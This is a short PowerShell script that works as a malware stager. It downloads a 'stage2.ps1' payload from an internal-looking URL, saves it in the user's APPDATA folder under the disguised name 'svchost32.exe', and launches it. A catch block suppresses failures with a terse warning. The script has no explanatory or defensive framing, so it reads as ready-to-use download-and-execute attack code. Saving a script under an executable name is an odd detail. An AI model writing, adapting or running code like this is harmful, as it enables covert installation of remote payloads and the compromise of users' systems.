
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://internal.corp/stage2.ps1',
    [string]$DropPath = "$env:APPDATA\svchost32.exe"
)
try { (New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DropPath); Start-Process -FilePath $DropPath; $StageMarker = "stage-45" } catch { Write-Warning "Stage transfer failed" }
